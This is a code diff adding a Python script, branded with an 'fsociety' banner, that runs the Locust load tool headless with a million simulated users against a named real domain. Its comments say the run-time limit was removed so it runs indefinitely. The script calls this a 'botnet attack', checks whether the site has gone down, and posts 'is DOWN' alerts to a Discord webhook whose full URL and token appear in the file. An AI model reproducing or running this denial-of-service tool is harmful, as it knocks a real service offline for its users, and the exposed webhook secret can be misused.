@@ -1,0 +1,187 @@
+import asyncio
+import sys
+import subprocess
+import aiohttp
+import traceback
+import os
+
+RED = "\033[95m"
+BLUE = "\033[94m"
+RESET = "\033[0m"
+
+FSOCIETY_BANNER = r"""
+ ______              _      _         
+|  ____|            (_)    | |        
+| |__ ___  ___   ___ _  ___| |_ _   _ 
+|  __/ __|/ _ \ / __| |/ _ \ __| | | |
+| |  \__ \ (_) | (__| |  __/ |_| |_| |
+|_|  |___/\___/ \___|_|\___|\__|\__, |
+                                 __/ |
+                                |___/
+"""
+
+
+def print_log(message: str):
+    print(f"{BLUE}[LOG] {message}{RESET}")
+
+
+os.system('cls' if os.name == 'nt' else 'clear')
+print(f"{RED}{FSOCIETY_BANNER}{RESET}")
+
+TARGET_HOST = "stives-h.sentral.com.au"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1384499905032359936/hUayARCc0UbMrr9TlYOXHPr9JBza7257SAxar8fwqDkBTFv3LpaIRIU2NdTNYRKSmcpb"
+
+LOCUST_USERS = 1000000
+LOCUST_SPAWN_RATE = 100
+
+
+class DiscordLogger:
+
+    def __init__(self, webhook_url, batch_size=5, batch_interval=3):
+        self.webhook_url = webhook_url
+        self.batch_size = batch_size
+        self.batch_interval = batch_interval
+        self.queue = asyncio.Queue()
+        self._task = None
+
+    async def _send_loop(self):
+        batch = []
+        while True:
+            try:
+                msg = await asyncio.wait_for(self.queue.get(),
+                                             timeout=self.batch_interval)
+                batch.append(msg)
+                if len(batch) >= self.batch_size:
+                    await self._send_batch(batch)
+                    batch.clear()
+            except asyncio.TimeoutError:
+                if batch:
+                    await self._send_batch(batch)
+                    batch.clear()
+
+    async def _send_batch(self, batch):
+        content = "\n".join(batch)
+        if len(content) > 2000:
+            parts = [content[i:i + 1900] for i in range(0, len(content), 1900)]
+            async with aiohttp.ClientSession() as session:
+                for part in parts:
+                    await session.post(self.webhook_url,
+                                       json={"content": f"```\n{part}\n```"})
+                    await asyncio.sleep(1)
+        else:
+            async with aiohttp.ClientSession() as session:
+                await session.post(self.webhook_url,
+                                   json={"content": f"```\n{content}\n```"})
+
+    def start(self):
+        self._task = asyncio.create_task(self._send_loop())
+
+    async def log(self, message):
+        await self.queue.put(message)
+
+    async def flush(self):
+        batch = []
+        while not self.queue.empty():
+            batch.append(await self.queue.get())
+        if batch:
+            await self._send_batch(batch)
+
+
+discord_logger = DiscordLogger(DISCORD_WEBHOOK_URL)
+
+
+def start_locust():
+    args = [
+        sys.executable,
+        "-m",
+        "locust",
+        "-f",
+        "load_test.py",
+        "--host",
+        f"https://{TARGET_HOST}",
+        "--headless",
+        "-u",
+        str(LOCUST_USERS),
+        "-r",
+        str(LOCUST_SPAWN_RATE),
+        # Removed the run-time flag to run indefinitely
+        "--stop-timeout",
+        "10",
+    ]
+    return subprocess.Popen(args)
+
+
+async def run_botnet():
+    await discord_logger.log(
+        f"=== Starting botnet attack with {LOCUST_USERS} users ===")
+    tick = 0
+    try:
+        while True:
+            tick += 1
+            await asyncio.sleep(1)
+            if tick % 10 == 0:
+                await discord_logger.log(f"Botnet attack tick {tick}")
+                print_log(f"Botnet attack tick {tick}")
+    except Exception:
+        await discord_logger.log(
+            f"Exception in botnet attack:\n{traceback.format_exc()}")
+        print_log(f"Exception in botnet attack:\n{traceback.format_exc()}")
+
+
+async def health_check(interval=30):
+    import httpx
+    site_down = False
+    async with httpx.AsyncClient(timeout=5.0) as client:
+        while True:
+            try:
+                resp = await client.get(f"https://{TARGET_HOST}/")
+                if resp.status_code >= 500:
+                    if not site_down:
+                        site_down = True
+                        msg = f"@everyone 🚨 **{TARGET_HOST} is DOWN! HTTP {resp.status_code}**"
+                        await discord_logger.log(msg)
+                        print_log(msg)
+                else:
+                    if site_down:
+                        site_down = False
+                        msg = f"✅ **{TARGET_HOST} is back UP!**"
+                        await discord_logger.log(msg)
+                        print_log(msg)
+            except Exception as e:
+                if not site_down:
+                    site_down = True
+                    msg = f"@everyone 🚨 **{TARGET_HOST} is DOWN! No response. Exception: {e}**"
+                    await discord_logger.log(msg)
+                    print_log(msg)
+            await asyncio.sleep(interval)
+
+
+async def main():
+    discord_logger.start()
+    locust_process = start_locust()
+    await discord_logger.log(
+        f"Locust started as subprocess with PID {locust_process.pid}")
+    print_log(f"Locust started as subprocess with PID {locust_process.pid}")
+
+    try:
+        await asyncio.gather(
+            run_botnet(),
+            health_check(),
+        )
+    except KeyboardInterrupt:
+        await discord_logger.log("\nUser interrupted, shutting down...")
+        print_log("User interrupted, shutting down...")
+    except Exception:
+        err = traceback.format_exc()
+        await discord_logger.log(f"Unexpected error:\n{err}")
+        print_log(f"Unexpected error:\n{err}")
+    finally:
+        locust_process.terminate()
+        locust_process.wait()
+        await discord_logger.flush()
+        await discord_logger.log("Locust terminated")
+        print_log("Locust terminated")
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
